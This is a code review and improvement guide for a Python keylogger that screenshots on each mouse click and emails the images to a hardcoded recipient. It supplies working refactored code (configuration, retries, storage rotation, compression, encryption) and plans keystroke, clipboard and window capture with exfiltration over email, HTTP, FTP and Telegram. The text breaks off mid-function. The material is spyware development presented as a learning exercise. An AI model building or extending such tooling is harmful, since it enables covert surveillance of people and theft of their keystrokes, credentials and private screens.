# AdvanceKeyLogger — Codebase Review & Improvement Guide

This document is a comprehensive reference covering every issue found in the current
codebase and detailed guidance on how to improve it. Use it as a checklist and
learning roadmap.

---

## Table of Contents

1. [Current Codebase Summary](#1-current-codebase-summary)
2. [Bugs & Issues Found](#2-bugs--issues-found)
3. [Project Structure Improvements](#3-project-structure-improvements)
4. [Configuration Management](#4-configuration-management)
5. [Error Handling](#5-error-handling)
6. [Logging Framework](#6-logging-framework)
7. [Class-Based Design & Modularity](#7-class-based-design--modularity)
8. [Plugin Architecture](#8-plugin-architecture)
9. [Storage Layer](#9-storage-layer)
10. [Data Compression](#10-data-compression)
11. [Encryption Utilities](#11-encryption-utilities)
12. [System Metadata Collection](#12-system-metadata-collection)
13. [Process Management](#13-process-management)
14. [Retry Logic & Resilience](#14-retry-logic--resilience)
15. [Cross-Platform Compatibility](#15-cross-platform-compatibility)
16. [Type Hints](#16-type-hints)
17. [Unit Testing](#17-unit-testing)
18. [CI/CD Pipeline](#18-cicd-pipeline)
19. [Linting & Code Quality](#19-linting--code-quality)
20. [Feature Ideas Summary](#20-feature-ideas-summary)
21. [Priority Roadmap](#21-priority-roadmap)

---

## 1. Current Codebase Summary

### Files

| File | Lines | Purpose |
|------|-------|---------|
| `createfile.py` | 63 | Main app — mouse listener, screenshot capture, periodic reporting |
| `mailLogger.py` | 38 | Email sending via Gmail SMTP |
| `credentials.json` | 4 | Plaintext email credentials (template) |

### Dependencies Used

| Library | Type | Purpose |
|---------|------|---------|
| `pyscreenshot` | External | Screen capture |
| `pynput` | External | Mouse/keyboard input listeners |
| `smtplib` | Standard lib | SMTP email sending |
| `email.message` | Standard lib | Email composition |
| `imghdr` | Standard lib | Image type detection (deprecated Python 3.11+) |
| `json` | Standard lib | Config parsing |
| `os` | Standard lib | File operations |
| `threading` | Standard lib | Timer/threading |
| `time` | Standard lib | Imported but unused |

### What It Currently Does

1. Starts a mouse click listener
2. On each click → captures a full screenshot → saves to `./screenshot/`
3. Every 30 seconds → emails all screenshots → deletes local copies
4. Runs indefinitely

---

## 2. Bugs & Issues Found

### Bug 1: Auto-Execute on Import (Critical)

**File:** `mailLogger.py`, line 38

```python
# This line at the module level runs every time the file is imported:
SendMail()
```

**Problem:** When `createfile.py` does `from mailLogger import SendMail`, Python
executes the entire `mailLogger.py` file, including the `SendMail()` call at the
bottom. This means an email is sent on *import*, before the program even starts.

**Fix:** Wrap it in a main guard:

```python
if __name__ == "__main__":
    SendMail()
```

**Learning concept:** Python's `if __name__ == "__main__"` pattern — understand how
Python module execution works and why this guard is essential.

---

### Bug 2: Unused Import

**File:** `createfile.py`, line 3

```python
from time import sleep  # Never used anywhere
```

**Fix:** Remove the unused import line.

**Learning concept:** Unused imports bloat the namespace, can cause circular import
issues, and signal poor code hygiene. Tools like `flake8` or `ruff` catch these
automatically.

---

### Bug 3: File Handle Never Closed

**File:** `mailLogger.py`, line 10

```python
f = open('credentials.json',)
data = json.load(f)
# f is never closed!
```

**Fix:** Use a context manager:

```python
with open('credentials.json') as f:
    data = json.load(f)
```

**Learning concept:** Context managers (`with` statement) guarantee cleanup (closing
files, releasing locks, etc.) even if exceptions occur. Always use them for
resources that need cleanup.

---

### Bug 4: Hardcoded Recipient Email

**File:** `mailLogger.py`, line 21

```python
msg['To'] = 'pexef43981@lovomon.com'
```

**Problem:** The recipient is hardcoded in the source code. It should be in the
configuration file alongside other settings.

**Fix:** Move to `credentials.json` or a separate config file:

```json
{
    "email": "sender@gmail.com",
    "password": "YourPassword",
    "recipient": "recipient@example.com"
}
```

---

### Bug 5: Typos in Code

| Location | Typo | Correct |
|----------|------|---------|
| `createfile.py:17` | `takeScreenshoot` | `takeScreenshot` |
| `createfile.py:20` | `Screenshoot_` | `Screenshot_` |
| `createfile.py:43` | `ScreenShoot Taken` | `Screenshot Taken` |
| `mailLogger.py:19` | `KeyLogger Stated...` | `KeyLogger Started...` |

**Learning concept:** Consistent naming matters. Typos in function names become part
of your API and are painful to fix later. Use a spell-checker plugin in your editor.

---

### Bug 6: Path Concatenation Without `os.path.join`

**File:** `createfile.py`, line 20 and `mailLogger.py`, line 25

```python
# Current (fragile):
file_path = path + "Screenshot_" + str(imageNumber) + ".png"

# Correct (cross-platform):
file_path = os.path.join(path, f"Screenshot_{imageNumber}.png")
```

**Learning concept:** String concatenation for paths breaks on different OS path
separators (`/` vs `\`). Always use `os.path.join()` or `pathlib.Path`.

---

### Bug 7: Global Variables Everywhere

**File:** `createfile.py`, lines 8-15

```python
global path
path = './screenshot/'
global intrevel
intrevel = 30
global imageNumber
imageNumber = 0
```

**Problem:** Six `global` declarations for state that should be encapsulated.
Global mutable state makes code hard to test, debug, and extend.

**Fix:** Encapsulate in a class (see Section 7).

---

### Bug 8: Deprecated `imghdr` Module

**File:** `mailLogger.py`, line 3

```python
import imghdr  # Deprecated since Python 3.11, removed in 3.13
```

**Fix options:**
- Use `Pillow` (PIL): `from PIL import Image; img = Image.open(f); img.format`
- Use `filetype` library: `import filetype; kind = filetype.guess(path)`
- Use `mimetypes` standard library: `mimetypes.guess_type(filename)`

---

### Bug 9: No Disk Space / Resource Limits

The screenshot counter (`imageNumber`) grows forever. If screenshots are taken
faster than the 30-second reporting cycle, disk space could be exhausted.

**Fix:** Add a maximum file count or total size limit (see Section 9).

---

### Bug 10: Timer Threads Accumulate

**File:** `createfile.py`, line 52

```python
timer = threading.Timer(intrevel, report)
timer.start()
```

Each call to `report()` creates a new `Timer`. These should be tracked and
cancelled on shutdown for clean exit.

**Fix:** Store the timer reference and cancel it during cleanup:

```python
class Reporter:
    def __init__(self):
        self._timer = None

    def start(self, interval):
        self._timer = threading.Timer(interval, self._run)
        self._timer.daemon = True  # Dies with main thread
        self._timer.start()

    def stop(self):
        if self._timer:
            self._timer.cancel()
```

---

## 3. Project Structure Improvements

### Current (Flat, Minimal)

```
AdvanceKeyLogger/
├── createfile.py
├── mailLogger.py
└── credentials.json
```

### Recommended Structure

```
AdvanceKeyLogger/
├── main.py                          # Entry point with argparse
├── requirements.txt                 # Pinned dependencies
├── pyproject.toml                   # Project metadata + tool config
├── .gitignore                       # Ignore sensitive/generated files
├── README.md                        # Project documentation
├── REVIEW.md                        # This file
│
├── config/
│   ├── __init__.py
│   ├── settings.py                  # Configuration loader class
│   └── default_config.yaml          # Default settings (all options)
│
├── capture/
│   ├── __init__.py
│   ├── base.py                      # Abstract base class for all captures
│   ├── keyboard_capture.py          # Keystroke logging
│   ├── mouse_capture.py             # Mouse events
│   ├── screenshot_capture.py        # Screen capture
│   ├── clipboard_capture.py         # Clipboard monitoring
│   └── window_capture.py            # Active window tracking
│
├── transport/
│   ├── __init__.py
│   ├── base.py                      # Abstract base transport
│   ├── email_transport.py           # SMTP email
│   ├── http_transport.py            # HTTP/webhook
│   ├── ftp_transport.py             # FTP/SFTP
│   └── telegram_transport.py        # Telegram Bot API
│
├── storage/
│   ├── __init__.py
│   ├── local_storage.py             # File-based storage
│   ├── sqlite_storage.py            # SQLite database storage
│   └── manager.py                   # Storage rotation & limits
│
├── utils/
│   ├── __init__.py
│   ├── crypto.py                    # Encryption/decryption
│   ├── compression.py               # Zip/gzip compression
│   ├── system_info.py               # OS, hostname, IP, etc.
│   └── process.py                   # PID lock, daemon mode
│
└── tests/
    ├── __init__.py
    ├── conftest.py                  # Shared pytest fixtures
    ├── test_config.py
    ├── test_capture.py
    ├── test_transport.py
    ├── test_storage.py
    └── test_utils.py
```

### How to Create This

```bash
# From project root:
mkdir -p config capture transport storage utils tests

# Create __init__.py in each package:
touch config/__init__.py capture/__init__.py transport/__init__.py \
      storage/__init__.py utils/__init__.py tests/__init__.py tests/conftest.py
```

### Key Principles

- **One responsibility per file** — each module does one thing
- **Package grouping** — related modules live in the same directory
- **`__init__.py` exports** — re-export key classes for clean imports:

```python
# capture/__init__.py
from .keyboard_capture import KeyboardCapture
from .mouse_capture import MouseCapture
from .screenshot_capture import ScreenshotCapture
```

This lets users write `from capture import KeyboardCapture` instead of
`from capture.keyboard_capture import KeyboardCapture`.

---

## 4. Configuration Management

### Problem

Settings are scattered across files as hardcoded values and global variables.

### Solution: YAML Config + Loader Class

**`config/default_config.yaml`:**

```yaml
general:
  report_interval: 30        # Seconds between reports
  data_dir: "./data"         # Where captured data is stored
  log_level: "INFO"          # DEBUG, INFO, WARNING, ERROR
  log_file: "./logs/app.log"

capture:
  keyboard:
    enabled: true
  mouse:
    enabled: true
  screenshot:
    enabled: true
    quality: 80              # JPEG quality (1-100)
    format: "png"            # png, jpg
    capture_region: "full"   # full, active_window
    max_count: 100           # Max screenshots before rotation
  clipboard:
    enabled: false
    poll_interval: 5         # Seconds between checks
  window:
    enabled: false
    poll_interval: 2

storage:
  backend: "local"           # local, sqlite
  max_size_mb: 500           # Maximum total storage
  rotation: true             # Auto-delete oldest when full
  sqlite_path: "./data/captures.db"

transport:
  method: "email"            # email, http, ftp, telegram
  retry_attempts: 3
  retry_backoff: 2           # Exponential backoff base (seconds)

  email:
    smtp_server: "smtp.gmail.com"
    smtp_port: 465
    use_ssl: true
    sender: ""
    password: ""
    recipient: ""

  http:
    url: ""
    method: "POST"
    headers: {}

  ftp:
    host: ""
    port: 21
    username: ""
    password: ""
    remote_dir: "/uploads"

  telegram:
    bot_token: ""
    chat_id: ""

encryption:
  enabled: false
  algorithm: "AES-256-CBC"
  key: ""                    # Will be generated if empty

compression:
  enabled: true
  format: "zip"              # zip, gzip
```

**`config/settings.py`:**

```python
"""
Configuration loader with validation and defaults.

Key concepts demonstrated:
- Singleton pattern
- YAML parsing
- Dictionary merging (defaults + overrides)
- Environment variable interpolation
- Validation
"""
import os
import yaml
from pathlib import Path
from typing import Any


class Settings:
    """Loads config from YAML with defaults, env var overrides, and validation."""

    _instance = None  # Singleton

    def __new__(cls, config_path: str | None = None):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance._initialized = False
        return cls._instance

    def __init__(self, config_path: str | None = None):
        if self._initialized:
            return
        self._initialized = True

        # Load defaults
        default_path = Path(__file__).parent / "default_config.yaml"
        with open(default_path) as f:
            self._config = yaml.safe_load(f)

        # Overlay user config if provided
        if config_path and os.path.exists(config_path):
            with open(config_path) as f:
                user_config = yaml.safe_load(f)
            self._config = self._deep_merge(self._config, user_config)

        # Override with environment variables
        self._apply_env_overrides()

        # Validate
        self._validate()

    def get(self, key_path: str, default: Any = None) -> Any:
        """
        Get a nested config value using dot notation.

        Example: settings.get("capture.screenshot.quality") -> 80
        """
        keys = key_path.split(".")
        value = self._config
        for key in keys:
            if isinstance(value, dict) and key in value:
                value = value[key]
            else:
                return default
        return value

    def _deep_merge(self, base: dict, override: dict) -> dict:
        """Recursively merge override dict into base dict."""
        result = base.copy()
        for key, value in override.items():
            if key in result and isinstance(result[key], dict) and isinstance(value, dict):
                result[key] = self._deep_merge(result[key], value)
            else:
                result[key] = value
        return result

    def _apply_env_overrides(self):
        """
        Allow environment variables to override config.

        Convention: KEYLOGGER_SECTION_KEY=value
        Example:    KEYLOGGER_TRANSPORT_METHOD=telegram
        """
        prefix = "KEYLOGGER_"
        for env_key, env_value in os.environ.items():
            if env_key.startswith(prefix):
                parts = env_key[len(prefix):].lower().split("_")
                self._set_nested(self._config, parts, env_value)

    def _set_nested(self, d: dict, keys: list[str], value: str):
        """Set a nested dictionary value from a list of keys."""
        for key in keys[:-1]:
            d = d.setdefault(key, {})
        # Try to preserve types (int, bool, etc.)
        d[keys[-1]] = self._cast_value(value)

    @staticmethod
    def _cast_value(value: str) -> Any:
        """Attempt to cast string env var to appropriate Python type."""
        if value.lower() in ("true", "yes", "1"):
            return True
        if value.lower() in ("false", "no", "0"):
            return False
        try:
            return int(value)
        except ValueError:
            pass
        try:
            return float(value)
        except ValueError:
            pass
        return value

    def _validate(self):
        """Validate critical configuration values."""
        interval = self.get("general.report_interval")
        if not isinstance(interval, (int, float)) or interval < 1:
            raise ValueError(f"report_interval must be >= 1, got {interval}")

        max_size = self.get("storage.max_size_mb")
        if not isinstance(max_size, (int, float)) or max_size < 1:
            raise ValueError(f"max_size_mb must be >= 1, got {max_size}")
```

### Key Learning Concepts

- **Singleton pattern** — only one Settings instance exists globally
- **Deep merge** — user config overrides defaults without losing unset values
- **Environment variable overrides** — 12-factor app methodology
- **Dot-notation access** — `settings.get("capture.screenshot.quality")`
- **Type casting** — converting string env vars to proper Python types
- **Validation** — fail fast on bad config instead of crashing later

---

## 5. Error Handling

### Problem

The current code has **zero** try/except blocks. Any failure crashes silently.

### Solution Pattern

```python
"""
Error handling patterns to apply throughout the codebase.
"""
import logging

logger = logging.getLogger(__name__)


# PATTERN 1: Specific exception handling
def take_screenshot(path: str) -> str | None:
    """Capture screenshot, return filepath or None on failure."""
    try:
        image = pyscreenshot.grab()
        filepath = os.path.join(path, f"screenshot_{count}.png")
        image.save(filepath)
        return filepath
    except OSError as e:
        logger.error("Failed to save screenshot to %s: %s", filepath, e)
        return None
    except Exception as e:
        logger.error("Unexpected error capturing screenshot: %s", e)
        return None


# PATTERN 2: Context manager for cleanup
class ResourceManager:
    """Ensures cleanup happens even if an error occurs."""

    def __enter__(self):
        self.acquire_resources()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.release_resources()
        if exc_type is not None:
            logger.error("Error during operation: %s", exc_val)
        return False  # Don't suppress the exception


# PATTERN 3: Retry decorator
import functools
import time

def retry(max_attempts: int = 3, backoff_base: float = 2.0):
    """Decorator that retries a function with exponential backoff."""
    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            for attempt in range(max_attempts):
                try:
                    return func(*args, **kwargs)
                except Exception as e:
                    if attempt == max_attempts - 1:
                        logger.error(
                            "%s failed after %d attempts: %s",
                            func.__name__, max_attempts, e
                        )
                        raise
                    wait_time = backoff_base ** attempt
                    logger.warning(
                        "%s attempt %d failed, retrying in %.1fs: %s",
                        func.__name__, attempt + 1, wait_time, e
                    )
                    time.sleep(wait_time)
        return wrapper
    return decorator


# Usage:
@retry(max_attempts=3, backoff_base=2.0)
def send_email(msg):
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(address, password)
        smtp.send_message(msg)


# PATTERN 4: Graceful degradation
def report():
    """Send report, gracefully handling partial failures."""
    files = collect_files()
    if not files:
        logger.info("No files to report")
        return

    try:
        send_data(files)
    except TransportError:
        logger.warning("Transport failed, files preserved for next cycle")
        return  # Don't delete files if send failed!

    cleanup_files(files)  # Only clean up on success
```

### Key Learning Concepts

- **Never catch bare `Exception` at the top level** — catch specific exceptions
- **Log before re-raising** — so you have diagnostic info
- **Graceful degradation** — if email fails, don't delete the screenshots
- **Retry with backoff** — for transient network failures
- **Context managers** — guarantee cleanup runs

---

## 6. Logging Framework

### Problem

The code uses `print()` for output. No log levels, no file output, no timestamps.

### Solution

```python
"""
utils/logger_setup.py — Centralized logging configuration.

Call setup_logging() once at startup (in main.py).
Then in every module: logger = logging.getLogger(__name__)
"""
import logging
import logging.handlers
import os
from pathlib import Path


def setup_logging(
    log_level: str = "INFO",
    log_file: str | None = None,
    max_bytes: int = 5_000_000,  # 5 MB per file
    backup_count: int = 3,       # Keep 3 rotated files
):
    """
    Configure logging for the entire application.

    Args:
        log_level: Minimum level to log (DEBUG, INFO, WARNING, ERROR)
        log_file: Path to log file (None = console only)
        max_bytes: Max size per log file before rotation
        backup_count: Number of rotated log files to keep
    """
    # Create formatter with timestamp, level, module, and message
    formatter = logging.Formatter(
        fmt="%(asctime)s | %(levelname)-8s | %(name)s:%(lineno)d | %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )

    # Root logger
    root_logger = logging.getLogger()
    root_logger.setLevel(getattr(logging, log_level.upper(), logging.INFO))

    # Console handler (always active)
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(formatter)
    root_logger.addHandler(console_handler)

    # File handler (optional, with rotation)
    if log_file:
        log_path = Path(log_file)
        log_path.parent.mkdir(parents=True, exist_ok=True)

        file_handler = logging.handlers.RotatingFileHandler(
            filename=str(log_path),
            maxBytes=max_bytes,
            backupCount=backup_count,
        )
        file_handler.setFormatter(formatter)
        root_logger.addHandler(file_handler)

    # Silence noisy third-party loggers
    logging.getLogger("urllib3").setLevel(logging.WARNING)
    logging.getLogger("PIL").setLevel(logging.WARNING)


# --- Usage in any module ---
# import logging
# logger = logging.getLogger(__name__)
#
# logger.debug("Detailed diagnostic info")
# logger.info("Screenshot captured: %s", filepath)
# logger.warning("Disk space low: %d MB remaining", space_mb)
# logger.error("Failed to send email: %s", error)
# logger.exception("Unexpected error")  # Includes stack trace
```

### Output Example

```
2025-01-15 14:30:22 | INFO     | capture.screenshot:45 | Screenshot captured: ./data/shot_001.png
2025-01-15 14:30:22 | WARNING  | storage.manager:78 | Storage at 90% capacity (450/500 MB)
2025-01-15 14:30:52 | ERROR    | transport.email:32 | SMTP connection failed: timeout
2025-01-15 14:30:54 | INFO     | transport.email:38 | Retry 1/3 succeeded
```

### Key Learning Concepts

- **Log levels** — DEBUG < INFO < WARNING < ERROR < CRITICAL
- **`__name__` as logger name** — automatically shows which module logged
- **Rotating file handler** — prevents log files from growing forever
- **Formatter** — consistent timestamp + context in every line
- **Never use `print()` in library code** — always use `logging`

---

## 7. Class-Based Design & Modularity

### Problem

All logic is in module-level code with global variables. Untestable and tightly
coupled.

### Solution: Encapsulate in Classes

```python
"""
capture/base.py — Abstract base class that all capture modules implement.

This is the foundation of the plugin architecture (Section 8).
"""
from abc import ABC, abstractmethod
import logging


class BaseCapture(ABC):
    """
    Abstract base class for all capture modules.

    Every capture module (keyboard, mouse, screenshot, etc.) must
    inherit from this class and implement these methods.
    """

    def __init__(self, config: dict):
        self.config = config
        self.logger = logging.getLogger(self.__class__.__name__)
        self._running = False

    @abstractmethod
    def start(self) -> None:
        """Start capturing. Must be non-blocking (use threads if needed)."""
        pass

    @abstractmethod
    def stop(self) -> None:
        """Stop capturing and clean up resources."""
        pass

    @abstractmethod
    def collect(self) -> list:
        """
        Return captured data since last collect() call.

        Returns a list of dicts:
        [
            {"type": "screenshot", "data": <bytes>, "timestamp": <float>},
            {"type": "keystroke", "data": "hello", "timestamp": <float>},
        ]
        """
        pass

    @property
    def is_running(self) -> bool:
        return self._running

    def __enter__(self):
        self.start()
        return self

    def __exit__(self, *args):
        self.stop()
```

```python
"""
capture/screenshot_capture.py — Screenshot module using the base class.

Demonstrates how to implement a concrete capture module.
"""
import os
import time
import threading
import logging
from pathlib import Path
from capture.base import BaseCapture

try:
    from PIL import ImageGrab  # Preferred over pyscreenshot
except ImportError:
    import pyscreenshot as ImageGrab

logger = logging.getLogger(__name__)


class ScreenshotCapture(BaseCapture):
    """Captures screenshots on mouse click or at intervals."""

    def __init__(self, config: dict):
        super().__init__(config)
        self._count = 0
        self._max_count = config.get("max_count", 100)
        self._format = config.get("format", "png")
        self._quality = config.get("quality", 80)
        self._data_dir = Path(config.get("data_dir", "./data/screenshots"))
        self._captured_files: list[dict] = []
        self._lock = threading.Lock()  # Thread safety

    def start(self) -> None:
        self._data_dir.mkdir(parents=True, exist_ok=True)
        self._running = True
        self.logger.info("Screenshot capture started (dir=%s)", self._data_dir)

    def stop(self) -> None:
        self._running = False
        self.logger.info("Screenshot capture stopped")

    def take_screenshot(self) -> str | None:
        """Capture a screenshot. Returns filepath or None on failure."""
        if not self._running:
            return None

        if self._count >= self._max_count:
            self.logger.warning("Max screenshot count reached (%d)", self._max_count)
            return None

        try:
            image = ImageGrab.grab()
            filename = f"screenshot_{self._count:04d}.{self._format}"
            filepath = self._data_dir / filename

            save_kwargs = {}
            if self._format == "jpg":
                save_kwargs["quality"] = self._quality

            image.save(str(filepath), **save_kwargs)
            self._count += 1

            with self._lock:
                self._captured_files.append({
                    "type": "screenshot",
                    "path": str(filepath),
                    "timestamp": time.time(),
                    "size": filepath.stat().st_size,
                })

            self.logger.info("Screenshot saved: %s", filename)
            return str(filepath)

        except OSError as e:
            self.logger.error("Failed to save screenshot: %s", e)
            return None
        except Exception as e:
            self.logger.error("Unexpected screenshot error: %s", e)
            return None

    def collect(self) -> list[dict]:
        """Return and clear the list of captured screenshots."""
        with self._lock:
            data = self._captured_files.copy()
            self._captured_files.clear()
        return data
```

### Key Learning Concepts

- **Abstract Base Classes (ABC)** — define contracts that subclasses must follow
- **Encapsulation** — state lives in `self`, not in global variables
- **Thread safety** — `threading.Lock()` protects shared data
- **Context managers** — `__enter__`/`__exit__` enable `with` syntax
- **`pathlib.Path`** — modern, cross-platform path handling
- **Graceful fallbacks** — try Pillow first, fall back to pyscreenshot

---

## 8. Plugin Architecture

### Concept

Make capture modules and transport modules pluggable — enable/disable them via
config without changing code.

```python
"""
capture/__init__.py — Plugin registry for capture modules.
"""
from capture.base import BaseCapture

# Registry maps config names to classes
_CAPTURE_REGISTRY: dict[str, type[BaseCapture]] = {}


def register_capture(name: str):
    """Decorator to register a capture plugin."""
    def decorator(cls):
        _CAPTURE_REGISTRY[name] = cls
        return cls
    return decorator


def get_capture_class(name: str) -> type[BaseCapture]:
    """Look up a capture class by name."""
    if name not in _CAPTURE_REGISTRY:
        available = ", ".join(_CAPTURE_REGISTRY.keys())
        raise ValueError(f"Unknown capture: '{name}'. Available: {available}")
    return _CAPTURE_REGISTRY[name]


def create_enabled_captures(config: dict) -> list[BaseCapture]:
    """
    Read the config and instantiate all enabled capture modules.

    Config example:
        capture:
          keyboard:
            enabled: true
          screenshot:
            enabled: true
            quality: 80
    """
    captures = []
    capture_config = config.get("capture", {})

    for name, settings in capture_config.items():
        if isinstance(settings, dict) and settings.get("enabled", False):
            cls = get_capture_class(name)
            captures.append(cls(settings))

    return captures
```

```python
# In each capture module, register with the decorator:

# capture/screenshot_capture.py
from capture import register_capture

@register_capture("screenshot")
class ScreenshotCapture(BaseCapture):
    ...

# capture/keyboard_capture.py
@register_capture("keyboard")
class KeyboardCapture(BaseCapture):
    ...
```

### Key Learning Concepts

- **Registry pattern** — map string names to classes for dynamic instantiation
- **Decorator pattern** — `@register_capture("name")` auto-registers on import
- **Open/Closed principle** — add new captures without modifying existing code
- **Factory function** — `create_enabled_captures()` builds objects from config

---

## 9. Storage Layer

### Problem

Screenshots are saved as loose files with no organization, metadata, or limits.

### Design

```python
"""
storage/manager.py — Manages data storage with size limits and rotation.
"""
import os
import logging
from pathlib import Path

logger = logging.getLogger(__name__)


class StorageManager:
    """Manages local file storage with size limits and auto-rotation."""

    def __init__(self, data_dir: str, max_size_mb: int = 500, rotation: bool = True):
        self.data_dir = Path(data_dir)
        self.max_size_bytes = max_size_mb * 1024 * 1024
        self.rotation = rotation
        self.data_dir.mkdir(parents=True, exist_ok=True)

    def get_total_size(self) -> int:
        """Calculate total size of all files in data directory."""
        return sum(f.stat().st_size for f in self.data_dir.rglob("*") if f.is_file())

    def get_usage_percent(self) -> float:
        """Return storage usage as a percentage."""
        return (self.get_total_size() / self.max_size_bytes) * 100

    def has_space(self, needed_bytes: int = 0) -> bool:
        """Check if there's enough space for new data."""
        return (self.get_total_size() + needed_bytes) < self.max_size_bytes

    def rotate(self) -> int:
        """
        Delete oldest files until under 80% capacity.
        Returns the number of files deleted.
        """
        if not self.rotation:
            return 0

        target = self.max_size_bytes * 0.8
        files = sorted(
            [f for f in self.data_dir.rglob("*") if f.is_file()],
            key=lambda f: f.stat().st_mtime,  # Oldest first
        )

        deleted = 0
        while self.get_total_size() > target and files:
            oldest = files.pop(0)
            size = oldest.stat().st_size
            oldest.unlink()
            deleted += 1
            logger.info("Rotated out: %s (%d bytes)", oldest.name, size)

        return deleted

    def store(self, data: bytes, filename: str, subdir: str = "") -> Path | None:
        """
        Store data to a file. Auto-rotates if needed.

        Returns the file path, or None if storage is full.
        """
        if not self.has_space(len(data)):
            if self.rotation:
                self.rotate()
            if not self.has_space(len(data)):
                logger.error("Storage full, cannot store %s", filename)
                return None

        target_dir = self.data_dir / subdir if subdir else self.data_dir
        target_dir.mkdir(parents=True, exist_ok=True)
        filepath = target_dir / filename

        filepath.write_bytes(data)
        logger.debug("Stored: %s (%d bytes)", filepath, len(data))
        return filepath

    def cleanup(self, files: list[str]) -> int:
        """Delete specific files after successful transport."""
        deleted = 0
        for filepath in files:
            try:
                Path(filepath).unlink()
                deleted += 1
            except FileNotFoundError:
                pass
            except OSError as e:
                logger.error("Failed to delete %s: %s", filepath, e)
        return deleted
```

### SQLite Storage Option

```python
"""
storage/sqlite_storage.py — Structured storage using SQLite.

Advantages over loose files:
- Queryable metadata (timestamps, types, sizes)
- Atomic operations
- Single file to manage
- Built into Python (no external deps)
"""
import sqlite3
import time
import logging
from pathlib import Path

logger = logging.getLogger(__name__)


class SQLiteStorage:
    """Store capture metadata and small data blobs in SQLite."""

    def __init__(self, db_path: str = "./data/captures.db"):
        self.db_path = Path(db_path)
        self.db_path.parent.mkdir(parents=True, exist_ok=True)
        self._conn = sqlite3.connect(str(self.db_path), check_same_thread=False)
        self._create_tables()

    def _create_tables(self):
        self._conn.executescript("""
            CREATE TABLE IF NOT EXISTS captures (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                type TEXT NOT NULL,           -- 'keystroke', 'screenshot', etc.
                data TEXT,                    -- Text data (keystrokes, window names)
                file_path TEXT,               -- Path to binary files (screenshots)
                file_size INTEGER DEFAULT 0,
                timestamp REAL NOT NULL,
                sent INTEGER DEFAULT 0        -- 0=pending, 1=sent
            );

            CREATE INDEX IF NOT EXISTS idx_captures_sent
                ON captures(sent);

            CREATE INDEX IF NOT EXISTS idx_captures_timestamp
                ON captures(timestamp);
        """)
        self._conn.commit()

    def insert(self, capture_type: str, data: str = "",
               file_path: str = "", file_size: int = 0) -> int:
        """Insert a capture record. Returns the row ID."""
        cursor = self._conn.execute(
            "INSERT INTO captures (type, data, file_path, file_size, timestamp) "
            "VALUES (?, ?, ?, ?, ?)",
            (capture_type, data, file_path, file_size, time.time())
        )
        self._conn.commit()
        return cursor.lastrowid

    def get_pending(self, limit: int = 50) -> list[dict]:
        """Get unsent captures, oldest first."""
        cursor = self._conn.execute(
            "SELECT id, type, data, file_path, timestamp "
            "FROM captures WHERE sent = 0 "
            "ORDER BY timestamp ASC LIMIT ?",
            (limit,)
        )
        columns = ["id", "type", "data", "file_path", "timestamp"]
        return [dict(zip(columns, row)) for row in cursor.fetchall()]

    def mark_sent(self, ids: list[int]):
        """Mark captures as successfully sent."""
        placeholders = ",".join("?" * len(ids))
        self._conn.execute(
            f"UPDATE captures SET sent = 1 WHERE id IN ({placeholders})", ids
        )
        self._conn.commit()

    def close(self):
        self._conn.close()
```

### Key Learning Concepts

- **Storage rotation** — automatically manage disk space
- **SQLite** — lightweight database built into Python
- **Atomic operations** — database transactions prevent data corruption
- **Index creation** — speeds up queries on `sent` and `timestamp` columns
- **Separation of metadata vs. binary data** — SQLite stores metadata, filesystem
  stores large files (screenshots)

---

## 10. Data Compression

```python
"""
utils/compression.py — Compress data before transport.

Reduces bandwidth usage and makes transfers faster.
"""
import io
import os
import zipfile
import gzip
import logging
from pathlib import Path

logger = logging.getLogger(__name__)


def zip_files(file_paths: list[str], output_path: str | None = None) -> bytes:
    """
    Compress multiple files into a ZIP archive.

    Args:
        file_paths: List of file paths to include
        output_path: Optional path to save ZIP file (returns bytes if None)

    Returns:
        ZIP archive as bytes
    """
    buffer = io.BytesIO()

    with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        for filepath in file_paths:
            path = Path(filepath)
            if path.exists():
                zf.write(str(path), arcname=path.name)
                logger.debug("Added to archive: %s", path.name)
            else:
                logger.warning("File not found, skipping: %s", filepath)

    data = buffer.getvalue()

    if output_path:
        Path(output_path).write_bytes(data)

    original_size = sum(
        Path(f).stat().st_size for f in file_paths if Path(f).exists()
    )
    logger.info(
        "Compressed %d files: %d -> %d bytes (%.1f%% reduction)",
        len(file_paths), original_size, len(data),
        (1 - len(data) / max(original_size, 1)) * 100,
    )

    return data


def gzip_data(data: bytes) -> bytes:
    """Compress bytes using gzip."""
    compressed = gzip.compress(data)
    logger.debug(
        "Gzip: %d -> %d bytes (%.1f%% reduction)",
        len(data), len(compressed),
        (1 - len(compressed) / max(len(data), 1)) * 100,
    )
    return compressed


def gunzip_data(data: bytes) -> bytes:
    """Decompress gzip bytes."""
    return gzip.decompress(data)
```

### Key Learning Concepts

- **`io.BytesIO`** — in-memory binary stream (avoids temp files)
- **ZIP vs GZIP** — ZIP archives multiple files, GZIP compresses a single stream
- **Compression ratios** — logging size reduction helps tune performance
- **`zipfile.ZIP_DEFLATED`** — the actual compression algorithm used inside ZIP

---

## 11. Encryption Utilities

```python
"""
utils/crypto.py — Encrypt/decrypt data using AES-256-CBC.

Dependencies: pip install cryptography

Concepts:
- Symmetric encryption (same key encrypts and decrypts)
- AES-256-CBC (industry standard)
- Initialization Vector (IV) for randomness
- Key derivation from passwords (PBKDF2)
- PKCS7 padding
"""
import os
import base64
import logging
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding, hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

logger = logging.getLogger(__name__)


def generate_key() -> str:
    """Generate a random 256-bit key, returned as base64 string."""
    key = os.urandom(32)  # 256 bits
    return base64.b64encode(key).decode('utf-8')


def derive_key_from_password(password: str, salt: bytes | None = None) -> tuple[bytes, bytes]:
    """
    Derive an encryption key from a password using PBKDF2.

    This is how you turn a human-memorable password into a proper
    encryption key. PBKDF2 makes brute-force attacks expensive.

    Returns:
        Tuple of (derived_key, salt) — save the salt for decryption!
    """
    if salt is None:
        salt = os.urandom(16)

    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,           # 256-bit key
        salt=salt,
